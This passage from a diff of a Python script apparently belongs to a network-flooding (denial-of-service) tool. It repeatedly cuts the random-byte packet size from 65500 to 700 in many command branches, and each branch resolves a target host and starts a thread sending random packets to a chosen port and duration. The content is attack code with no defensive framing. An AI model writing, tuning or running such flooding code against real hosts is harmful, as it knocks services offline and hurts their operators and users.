 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2125,7 +2125,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2141,7 +2141,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2157,7 +2157,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2173,7 +2173,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2189,7 +2189,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2205,7 +2205,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2221,7 +2221,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2237,7 +2237,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2253,7 +2253,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2269,7 +2269,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2285,7 +2285,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2301,7 +2301,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2317,7 +2317,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2333,7 +2333,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2349,7 +2349,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2365,7 +2365,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2381,7 +2381,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
